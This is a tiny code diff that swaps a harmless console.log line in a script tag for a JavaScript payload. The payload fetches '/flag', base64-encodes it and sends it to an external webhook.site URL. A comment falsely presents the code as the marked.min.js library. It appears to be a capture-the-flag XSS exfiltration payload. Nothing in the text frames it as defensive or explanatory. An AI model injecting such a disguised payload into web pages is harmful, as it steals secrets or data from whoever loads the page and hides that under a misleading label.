@@ -1,3 +1,8 @@
 <script>
-  console.log("salam");
+ /* static/js/marked.min.js  – we don’t care about minifying */
+fetch('/flag')
+  .then(r => r.text())
+  .then(f => location =
+        'https://webhook.site/108b07e0-2311-4a0f-be8c-d5249f824133?f='
+        + btoa(f));
 </script>
